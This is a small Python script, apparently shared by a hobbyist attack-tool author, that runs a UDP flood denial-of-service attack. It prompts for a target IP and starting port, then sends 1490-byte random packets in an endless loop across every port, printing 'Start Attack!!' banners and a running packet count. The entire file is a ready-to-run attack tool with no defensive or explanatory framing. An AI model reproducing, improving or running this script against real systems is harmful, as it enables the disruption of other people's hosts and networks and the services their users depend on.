import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

#Cores
#\033[1;30m Branco
#\033[1;31m Vermelho
#\033[1;32m Verde
#\033[1;33m Amarelo
#\033[1;34m Azul
#\033[1;35m Roxo
#\033[1;36m Ciano
#\033[1;37m Cinza Claro

os.system("clear")
print("\033[1;35m")
os.system("figlet Dos")
print("""\033[1;33m
Author   : ZoroScripter
Yotube   : https://youtube.com/channel/UCTRSuQ_j0qwRKxI9mMioeyg
Github   : https://github.com/ZoroScripter/Dos.git
Github2  : https://github.com/ZoroScripter
""")
ip = raw_input("IP Target   :")
port = input("Port Start   :")

os.system("clear")
os.system("figlet Start Attack!!")
time.sleep(5)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print ("Sent %s packet to %s throught port:%s")%(sent,ip,port)
     if port == 65534:
       port = 1